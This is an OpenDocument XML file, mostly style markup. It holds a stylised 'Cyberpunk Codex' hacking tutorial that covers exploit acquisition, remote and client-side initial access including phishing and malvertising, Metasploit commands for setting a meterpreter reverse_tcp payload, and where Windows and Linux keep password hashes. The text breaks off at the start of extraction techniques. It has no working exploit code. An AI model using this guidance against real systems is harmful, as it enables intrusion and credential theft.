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list-style-name="L9">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
      <style:text-properties style:font-name="Google Sans Text"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
      <style:text-properties style:font-name="Google Sans Text"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L12">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
      <style:text-properties style:font-name="Google Sans Text"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L32">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
      <style:text-properties style:font-name="Google Sans Text"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L5">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L7">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L8">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L11">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L12">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L13">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L14">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L15">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L16">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L17">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L18">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L19">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L20">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L21">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L22">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L23">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L24">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L25">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L26">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L27">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L28">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L29">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L30">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L31">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L32">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L33">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%" fo:padding="0in" fo:border="none"/>
      <style:text-properties style:font-name="Google Sans Text"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:line-height="114%"/>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 Core systems cycling up. Data stream initiated. You are receiving the Cyberpunk Codex, Sector 07: System Hacking. Previous transmissions decoded reconnaissance, scanning, enumeration. Foundational firmware. Necessary, but insufficient. The real work begins now. Accessing the target mainframe. Bypassing security layers. Establishing control. This is not theoretical. This is operational imperative. You are here because the static world is not enough. You see the grid not as a utility, but as a canvas. Good. Let’s begin etching your mark.</text:p>
      <text:section text:style-name="Sect1" text:name="model-response-message-contentr_94d89d3b3dce5587">
        <text:p text:style-name="Horizontal_20_Line"/>
        <text:h text:style-name="P41" text:outline-level="2"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">:: Sector 01: Exploit Acquisition ::</text:span></text:span></text:h>
        <text:p text:style-name="P1">Before the breach, before the infiltration, comes the weapon selection. An exploit is not magic. It is precision engineering against flawed design. A vulnerability is a crack in the target's armor. An exploit is the shaped charge placed within that crack. Your first task is locating the correct charge for the identified fissure.</text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Data Forges: Exploit Databases</text:span></text:span></text:p>
        <text:p text:style-name="P1">The digital underground maintains archives – repositories teeming with payloads designed for known vulnerabilities. Sites like Exploit-DB are primary nodes in this network. These are not armories for script kiddies; they are libraries for operators. Understand their structure:</text:p>
        <text:list xml:id="list8236579143586974840" text:style-name="L1">
          <text:list-item>
            <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Remote Exploits:</text:span></text:span><text:span text:style-name="T1"> Code designed to trigger vulnerabilities across the network. Target services listening on open ports identified during scanning. Think buffer overflows in unpatched daemons, command injection flaws in web interfaces. These are your initial breach vectors. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Web Application Exploits:</text:span></text:span><text:span text:style-name="T1"> Specialized tools targeting the complex layers of web frameworks, CMS platforms (WordPress, Joomla, Drupal – frequent offenders), and custom application logic. SQL injection, cross-site scripting (XSS), server-side request forgery (SSRF) – these are common tools in this arsenal. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Local Exploits:</text:span></text:span><text:span text:style-name="T1"> Crucial for post-breach escalation. Once initial access is gained, often as a low-privileged user, these exploits target flaws within the operating system kernel, services running with higher privileges, or misconfigured permissions to elevate your access level. Gaining SYSTEM or root is the objective. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Denial of Service (DoS) Exploits:</text:span></text:span><text:span text:style-name="T1"> Less about access, more about disruption. Designed to crash services or entire systems, consuming resources (CPU, memory, network bandwidth) until failure. Useful for distraction, disruption, or crippling target operations. Use tactically. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Shellcode:</text:span></text:span><text:span text:style-name="T1"> The payload itself. Raw, architecture-specific machine code designed to execute a specific function once the exploit successfully hijacks program execution. Often, this function is spawning a shell (command prompt/terminal) providing direct interaction with the compromised system. Shellcode must be tailored to the target OS (Windows, Linux, macOS) and architecture (x86, x64, ARM). </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Operational Procedure: Search and Selection</text:span></text:span></text:p>
        <text:p text:style-name="P1">Do not blindly download and run code. That is amateur hour.</text:p>
        <text:list xml:id="list3668949383018287225" text:style-name="L2">
          <text:list-item>
            <text:p text:style-name="P8"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Correlate Vulnerability Data:</text:span></text:span><text:span text:style-name="T1"> Match findings from your vulnerability scans (Nessus, OpenVAS outputs) against exploit database entries. Use CVE identifiers, software versions, and service names. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P8"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Analyze Exploit Code:</text:span></text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">Read the source.</text:span></text:span><text:span text:style-name="T1"> Understand the mechanism. Python, Ruby, Perl, C – languages vary. Identify the vulnerability it targets, the conditions required for success, and the expected outcome. Check for embedded payloads or callbacks – ensure they align with </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">your</text:span></text:span><text:span text:style-name="T1"> objectives, not some unknown third party's. Verify it's not malware targeting </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">you</text:span></text:span><text:span text:style-name="T1">. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P8"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Consider the Environment:</text:span></text:span><text:span text:style-name="T1"> Is the exploit designed for the correct OS version? Architecture? Service pack? Does it require specific libraries or configurations on the target? Mismatched environments lead to failed exploits or, worse, system instability that alerts defenders. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P8"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Test in Isolation:</text:span></text:span><text:span text:style-name="T1"> Before deploying against a live target, test the exploit in a controlled lab environment mimicking the target's setup. Virtual machines are indispensable here. Verify functionality, understand potential side effects, and refine deployment tactics. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Alternative Data Streams: The Darker Net</text:span></text:span></text:p>
        <text:p text:style-name="P1">Beyond public repositories, exploit code circulates in more restricted channels – forums, private groups, dark web markets accessible via Tor. Exercise extreme caution.</text:p>
        <text:list xml:id="list7226059984253144028" text:style-name="L3">
          <text:list-item>
            <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Verification Challenges:</text:span></text:span><text:span text:style-name="T1"> Source authenticity is dubious. Code may be backdoored, designed to compromise the attacker. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Ethical Boundaries:</text:span></text:span><text:span text:style-name="T1"> Acquiring exploits through illicit means crosses lines. Maintain operational integrity. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Cost &amp; Reliability:</text:span></text:span><text:span text:style-name="T1"> Pay-for-exploit markets exist, but value and reliability are highly variable. Zero-day exploits (previously unknown vulnerabilities) command high prices but may be quickly patched once discovered. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P1">Stick to vetted sources unless operational parameters absolutely necessitate higher risk acquisition – and you possess the skills to thoroughly analyze and neutralize any embedded threats.</text:p>
        <text:p text:style-name="P40">:: Intel Feed ::</text:p>
        <text:p text:style-name="P40">Exploit acquisition is intelligence work. Match the tool precisely to the weakness. Understand your weapon before deployment. Test rigorously. Assume nothing. An exploit failure is not just a setback; it's noise that alerts the target. Operate with precision.</text:p>
        <text:p text:style-name="Horizontal_20_Line"/>
        <text:h text:style-name="P41" text:outline-level="2"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">:: Sector 02: System Compromise - Initial Access ::</text:span></text:span></text:h>
        <text:p text:style-name="P1">Exploit located. Payload selected. Execution environment verified. Now, the breach. This phase translates theoretical access into tangible control. Success requires meticulous execution, adapting to target defenses.</text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Remote Service Exploitation</text:span></text:span></text:p>
        <text:p text:style-name="P1">This is the classic vector. Services exposed to the network – web servers (HTTP/S), mail servers (SMTP/POP/IMAP), file servers (SMB/NFS), databases (MySQL/MSSQL/Oracle), remote admin protocols (SSH/RDP) – often harbor vulnerabilities if unpatched or misconfigured.</text:p>
        <text:list xml:id="list5722723287913132150" text:style-name="L4">
          <text:list-item>
            <text:p text:style-name="P10"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Targeting:</text:span></text:span><text:span text:style-name="T1"> Use scan data (Nmap, Nessus) to identify specific service versions. Match these against acquired exploits. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P10"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Execution:</text:span></text:span><text:span text:style-name="T1"> Deploy the exploit using the appropriate tool or script. This might involve custom clients, Metasploit framework modules, or standalone executables. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P10"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Payload Delivery:</text:span></text:span><text:span text:style-name="T1"> The exploit’s function is to hijack execution flow. It then delivers the shellcode. Common payloads include: </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P10"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Reverse Shell:</text:span></text:span><text:span text:style-name="T1"> The compromised system initiates an outbound connection back to an attacker-controlled listener. More likely to bypass firewalls restricting inbound connections. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P10"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Bind Shell:</text:span></text:span><text:span text:style-name="T1"> The compromised system opens a listening port, waiting for the attacker to connect </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">in</text:span></text:span><text:span text:style-name="T1">. Less common due to firewall restrictions. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P10"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Stabilization:</text:span></text:span><text:span text:style-name="T1"> Initial shells can be unstable. Upgrade to more robust control mechanisms like Meterpreter (Metasploit's advanced payload) immediately. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Client-Side Exploitation</text:span></text:span></text:p>
        <text:p text:style-name="P1">Why batter the fortress walls when you can trick a guard into opening the gate? Client-side attacks target user applications – web browsers, email clients, document readers (PDF, Office), media players.</text:p>
        <text:list xml:id="list2816721909097820834" text:style-name="L5">
          <text:list-item>
            <text:p text:style-name="P11"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Delivery Vectors:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P11"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Phishing/Spear Phishing:</text:span></text:span><text:span text:style-name="T1"> Crafting convincing emails or messages containing malicious links or attachments. Spear phishing targets specific individuals or groups, using tailored lures based on reconnaissance. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P11"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Watering Hole Attack:</text:span></text:span><text:span text:style-name="T1"> Compromising a legitimate website frequented by the target demographic, injecting malicious code to infect visitors. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P11"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Malicious Advertisements (Malvertising):</text:span></text:span><text:span text:style-name="T1"> Injecting exploit code into ad networks, distributing malware through legitimate site ad spaces. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P11"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Exploit Kits (EKs):</text:span></text:span><text:span text:style-name="T1"> Automated web-based platforms that probe visiting </text:span><text:soft-page-break/><text:span text:style-name="T1">browsers/plugins for vulnerabilities and deliver corresponding exploits. Often hosted on compromised websites or delivered via malvertising. Examples (historically): Angler, RIG, Neutrino. EKs adapt rapidly to new vulnerabilities. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P11"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Payloads:</text:span></text:span><text:span text:style-name="T1"> Often droppers – small initial payloads that download and install more substantial malware (backdoors, ransomware, keyloggers) once initial access is achieved. Fileless malware, residing only in memory, is increasingly common to evade disk-based antivirus. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Social Engineering Integration</text:span></text:span></text:p>
        <text:p text:style-name="P1">Technical exploits are frequently paired with social engineering. A convincing pretext (fake invoice, urgent security alert, enticing offer) increases the likelihood a user will click a link or open an attachment, triggering the client-side exploit.</text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">The Metasploit Framework: An Operator's Console</text:span></text:span></text:p>
        <text:p text:style-name="P1">Metasploit is more than a tool; it's an operational environment. It integrates scanning, exploit modules, payloads, post-exploitation tools, and auxiliary functions.</text:p>
        <text:list xml:id="list1785161139759199686" text:style-name="L6">
          <text:list-item>
            <text:p text:style-name="P12"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Workflow:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">search [vulnerability/software/CVE]</text:span></text:span><text:span text:style-name="T1">: Locate relevant exploit modules. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">use [module_path]</text:span></text:span><text:span text:style-name="T1">: Select the module. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">show options</text:span></text:span><text:span text:style-name="T1">: Display required parameters (RHOSTS, LHOST, payload). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">set [option] [value]</text:span></text:span><text:span text:style-name="T1">: Configure the module (target IP, listener IP, payload type). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">show payloads</text:span></text:span><text:span text:style-name="T1">: List compatible payloads for the exploit. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">set payload [payload_path]</text:span></text:span><text:span text:style-name="T1">: Select the desired payload (e.g., </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">windows/meterpreter/reverse_tcp</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">exploit</text:span></text:span><text:span text:style-name="T1"> or </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">run</text:span></text:span><text:span text:style-name="T1">: Launch the attack. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P12"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Meterpreter:</text:span></text:span><text:span text:style-name="T1"> Metasploit's advanced, multi-functional payload. Provides an extensible command shell on the target, enabling file system interaction, process control, network pivoting, privilege escalation, password hash dumping, screen capture, keystroke logging, and much more, often in-memory to reduce forensic footprint. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P1">Mastering Metasploit is non-negotiable for efficient and scalable operations.</text:p>
        <text:p text:style-name="P40">:: Intel Feed ::</text:p>
        <text:p text:style-name="P40">Initial access is about finding the path of least resistance. Remote services require technical precision. Client-side attacks exploit human trust. Often, the most effective breach combines both. Your entry point dictates your initial options. Choose wisely. Establish control quickly. Minimize noise.</text:p>
        <text:p text:style-name="Horizontal_20_Line"/>
        <text:h text:style-name="P41" text:outline-level="2"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">:: Sector 03: Post-Exploitation - Credential Acquisition ::</text:span></text:span></text:h>
        <text:p text:style-name="P1">Access achieved. You are inside the wire. But your initial foothold is likely tenuous, operating with the limited privileges of the compromised service or user account. The next critical phase: harvesting credentials. Passwords are the keys to the kingdom.</text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Why Credentials Matter</text:span></text:span></text:p>
        <text:list xml:id="list3364345394062009845" text:style-name="L7">
          <text:list-item>
            <text:p text:style-name="P13"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Privilege Escalation:</text:span></text:span><text:span text:style-name="T1"> User accounts rarely have administrative rights. Compromised credentials (especially administrator or service accounts) unlock higher privilege levels. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P13"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Lateral Movement:</text:span></text:span><text:span text:style-name="T1"> Enterprises are networks of trust. Credentials valid on one system are often valid on others within the same domain or trust boundary. A single harvested password can unlock dozens of systems. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P13"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Persistence:</text:span></text:span><text:span text:style-name="T1"> Creating new accounts or using existing high-privilege accounts provides alternative access routes if your initial exploit path is discovered and closed. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P13"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Access to Data:</text:span></text:span><text:span text:style-name="T1"> Specific accounts are tied to specific data repositories (databases, file shares). Gaining access to these accounts grants access to the target's valuable information assets. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Password Storage Mechanisms</text:span></text:span></text:p>
        <text:p text:style-name="P1">Understanding where and how passwords are stored is crucial for extraction.</text:p>
        <text:list xml:id="list4069157564599933140" text:style-name="L8">
          <text:list-item>
            <text:p text:style-name="P14"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Windows:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P14"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">SAM (Security Account Manager) Database:</text:span></text:span><text:span text:style-name="T1"> Stores local account password hashes (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">C:\Windows\System32\config\SAM</text:span></text:span><text:span text:style-name="T1">). Access requires SYSTEM privileges. Contains LM (LanMan - outdated, easily cracked) and NTLM hashes. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P14"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">LSASS (Local Security Authority Subsystem Service):</text:span></text:span><text:span text:style-name="T1"> Process (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">lsass.exe</text:span></text:span><text:span text:style-name="T1">) that handles security policy enforcement and user authentication. Often caches credentials (hashes, sometimes plaintext passwords, Kerberos tickets) in memory for logged-on users or services. Dumping LSASS memory requires high privileges but can yield valuable active credentials. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P14"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Active Directory (NTDS.dit):</text:span></text:span><text:span text:style-name="T1"> The central database on Domain Controllers storing all domain user and computer account information, including password hashes (typically NTLM). Requires Domain Admin privileges to access remotely or offline access to a DC backup. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P14"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Linux/Unix:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P14"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">/etc/passwd</text:span></text:span><text:span text:style-name="T1">: Publicly readable file containing user account information (username, UID, GID, home directory, shell) but </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">not</text:span></text:span><text:span text:style-name="T1"> password hashes (historically, it did). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P14"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">/etc/shadow</text:span></text:span><text:span text:style-name="T1">: Restricted file (readable only by root) containing the actual password hashes, along with password aging information. Hashes use various </text:span><text:soft-page-break/><text:span text:style-name="T1">algorithms (MD5, SHA-256, SHA-512) often with salting (random data added before hashing) to thwart precomputed rainbow table attacks. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Extraction Techniques</text:span></text:span></text:p>
        <text:list xml:id="list6000345120089328907" text:style-name="L9">
          <text:list-item>
